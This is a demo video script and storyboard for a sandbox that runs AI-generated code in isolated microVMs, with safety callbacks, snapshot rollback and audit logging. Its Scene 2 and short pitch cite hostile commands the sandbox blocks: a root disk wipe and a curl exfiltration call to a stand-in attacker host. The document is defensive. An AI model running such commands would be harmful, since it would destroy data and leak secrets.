# Celesto Sandbox Code Verification Agent — Complete Demo Video Script & Storyboard

This guide gives you the **word-for-word voiceover script starting right from your personal introduction**, with screen action cues, timestamps, and recording guidance.

---

## Quick Recording Checklist

- **Presenter**: Bhanu
- **Project**: Celesto Sandbox Code Verification Agent
- **Repository**: [https://github.com/Chadikabhanu/Celesto-Sandbox-Agent](https://github.com/Chadikabhanu/Celesto-Sandbox-Agent)
- **Target Video Duration**: ~2.5 Minutes (Optimal for hackathons & technical evaluations)
- **Screen Setup**:
  - **Left 50%**: Terminal running the live walkthrough script
  - **Right 50%**: VS Code displaying `README.md` (Architecture diagram) & GitHub repo
- **One-Command Automated Demo**:
  ```bash
  python scripts/demo_walkthrough.py --auto --delay 1.8
  ```

---

## Complete Video Presentation Script (Word-for-Word)

### Scene 0: Personal Introduction & The Problem (0:00 – 0:25)

- **On Screen**: 
  - Camera on you or screen showing GitHub repository title page / [README.md](README.md).
- **Action**:
  - Point to the repository header and the problem statement.
- **Spoken Voiceover**:
  > *"Hello everyone! My name is Bhanu, and today I am excited to present the **Celesto Sandbox Code Verification Agent**.*
  > 
  > *Autonomous AI coding agents are rapidly evolving—they generate code, synthesize test suites, and execute scripts in iterative feedback loops. But running untrusted, AI-generated code directly on host machines or standard Docker containers creates catastrophic security and reliability risks: accidental host file deletion, secret and credential exfiltration over outbound sockets, and cascading step failures with no clean rollback.*
  > 
  > *To solve this, I designed and built an isolated execution plane using **Celesto disposable microVMs**, backed by pre-execution safety callbacks and a trusted host-side ledger."*

---

### Scene 1: Architectural Boundary & MicroVM Provisioning (0:25 – 0:50)

- **On Screen**:
  - Switch focus to the terminal.
  - Run `python scripts/demo_walkthrough.py --auto --delay 1.8` (or interactive mode).
  - Terminal displays **Scene 1**: microVM allocation and lifecycle state machine transitions.
- **Action**:
  - Cursor highlights the unique sandbox name (`sbx-...`) and the `celesto_sandbox` microVM target.
- **Spoken Voiceover**:
  > *"Let's look at the architectural boundary in action.*
  > 
  > *When an agent submits untrusted code for verification, the control plane allocates a dedicated microVM with a cryptographically unique identifier matching our strict regex schema.*
  > 
  > *Notice that we enforce **zero host subprocess fallback**—all code executes exclusively inside disposable microVM hardware boundaries. In just 58 milliseconds, the microVM boots from `created` to `ready` and transitions to `running`, completely isolated from our host system."*

---

### Scene 2: Pre-Execution Safety Callbacks & Zero Host Mutation (0:50 – 1:20)

- **On Screen**:
  - Terminal displays **Scene 2**: hostile attack payloads being evaluated.
  - Highlights `[VETOED / BLOCKED]` in red for disk wipes (`rm -rf /`), canary exfiltration (`curl http://evil-exfil.com`), and host fixture tampering.
- **Action**:
  - Highlight the `Host Fixture Integrity Check: PASS` and `Canary Token Disclosed: FALSE`.
- **Spoken Voiceover**:
  > *"Now, what happens if an adversarial prompt injection or a buggy agent attempts to compromise the host?*
  > 
  > *Standard container sandboxes only check exit codes after damage has already occurred. But here, we implement Celesto's class-based safety callbacks—`CelestoSafetyCallback.on_pre_run`.*
  > 
  > *As you can see on screen, when untrusted code attempts a root directory wipe with `rm -rf /`, or tries to exfiltrate our host canary token via an external curl socket, the callback intercepts and vetoes the command before it ever reaches the guest kernel.*
  > 
  > *Our baseline SHA-256 fixture hash remains 100% intact, with zero host contamination."*

---

### Scene 3: Step 7 Transient Fault & Snapshot Checkpoint Recovery (1:20 – 1:55)

- **On Screen**:
  - Terminal displays **Scene 3**: the canonical 10-step verification pipeline.
  - Shows Step 6 snapshot checkpoint, Step 7 simulated timeout on Attempt 1, Step 8 recovery rollback, and Step 7 success on Attempt 2.
- **Action**:
  - Point to the magenta recovery step and green re-execution on Attempt 2.
- **Spoken Voiceover**:
  > *"In long agent pipelines, test verification steps frequently suffer from transient network spikes or flaky test runners. Restarting an entire 10-step pipeline wastes significant time and compute.*
  > 
  > *To address this, we capture a clean point-in-time snapshot of the guest at Step 6.*
  > 
  > *At Step 7, a transient timeout occurs on Attempt 1. Instead of crashing or restarting, our recovery engine applies the `checkpoint_rollback_retry` policy. It instantly rolls the guest `/workspace` back to the Step 6 snapshot and retries verification on Attempt 2.*
  > 
  > *The verification passes, proof artifacts are extracted, and the sandbox cleanly tears down—saving compute while maintaining state integrity."*

---

### Scene 4: High-Throughput Concurrency & Scale (1:55 – 2:20)

- **On Screen**:
  - Terminal displays **Scene 4**: 5 simultaneous jobs dispatched in parallel with `asyncio.gather`.
  - Shows all 5 jobs completing with independent sandboxes and terminal teardown to `deleted`.
- **Action**:
  - Point out `Collisions: 0` and `Shared-State Leaks: 0`.
- **Spoken Voiceover**:
  > *"When scaling benchmark evaluations across multiple agent runs, running concurrent jobs often leads to cross-job collisions.*
  > 
  > *In Scene 4, we evaluate 5 parallel verification workloads running simultaneously.*
  > 
  > *Because each job is confined to its own microVM, all 5 execute concurrently with zero namespace collisions, zero shared-state leaks, and sub-second execution speeds, with guaranteed cleanup to the `deleted` state."*

---

### Scene 5: Cryptographic Audit Ledger & Conclusion (2:20 – 2:45)

- **On Screen**:
  - Terminal displays **Scene 5**: `logs/commands.jsonl` audit entries and the test summary.
  - Briefly switch to terminal to run `pytest tests/test_reports.py -v` (all 11 contract checks passing).
- **Action**:
  - Show the 100% pass rate and clean GitHub repo.
- **Spoken Voiceover**:
  > *"Finally, auditability. Every single command attempt, security decision, and lifecycle event is logged immutably in our host PostgreSQL ledger and `commands.jsonl` audit trail for end-to-end provenance.*
  > 
  > *Our entire test suite—including 108 automated unit tests, 11 submission contract checks, and 20 sequential reliability runs—passes with a 100% success rate.*
  > 
  > *The Celesto Sandbox Code Verification Agent makes autonomous agent code execution truly safe, reliable, and production-ready.*
  > 
  > *Thank you for watching!"*

---

## Alternative: 90-Second Fast Pitch (For Strict Time Limits)

If your competition or evaluation requires a **strict 90-second video**, use this concise version:

1. **Introduction (0:00 – 0:15)**:
   *"Hi, I'm Bhanu. Autonomous AI agents write and test code constantly, but running that code on host machines risks data wipes, secret leaks, and unrecoverable crashes. Here is the Celesto Sandbox Code Verification Agent."*
2. **Containment & Safety (0:15 – 0:40)**:
   *"Using Celesto disposable microVMs with zero host subprocess fallback, our pre-execution safety callbacks intercept malicious commands like `rm -rf /` and canary exfiltration before they reach the guest kernel. Our host fixtures remain completely untampered."*
3. **Snapshot Recovery (0:40 – 1:05)**:
   *"When verification steps hit transient timeouts at Step 7, our recovery engine restores the guest from our Step 6 snapshot, re-executes cleanly on Attempt 2, and succeeds without re-running the whole pipeline."*
4. **Scale & Verification (1:05 – 1:30)**:
   *"With 5 parallel concurrent jobs experiencing zero collisions, immutable cryptographic audit logging, and 108 tests passing with 100% reliability, this platform provides the trusted foundation for autonomous code verification. Thank you!"*

---

## Recommended Video Recording Layout

```
+------------------------------------------+------------------------------------------+
|  TERMINAL (60% Width)                    |  VS CODE / BROWSER (40% Width)           |
|                                          |                                          |
|  $ python scripts/demo_walkthrough.py    |  README.md:                              |
|                                          |  • Mermaid Architecture Diagram          |
|  >>> [SCENE 1] MicroVM Lifecycle         |  • Core Challenges & Solution Matrix     |
|  >>> [SCENE 2] Safety Callbacks          |  • GitHub: Chadikabhanu/Celesto-Sandbox  |
|  >>> [SCENE 3] Step 7 Snapshot Recovery  |                                          |
|  >>> [SCENE 4] Concurrency (5 Jobs)      |  Test Suite:                             |
|  >>> [SCENE 5] Audit Trail & Metrics     |  • 108 Passed, 100% Reliability          |
+------------------------------------------+------------------------------------------+
```
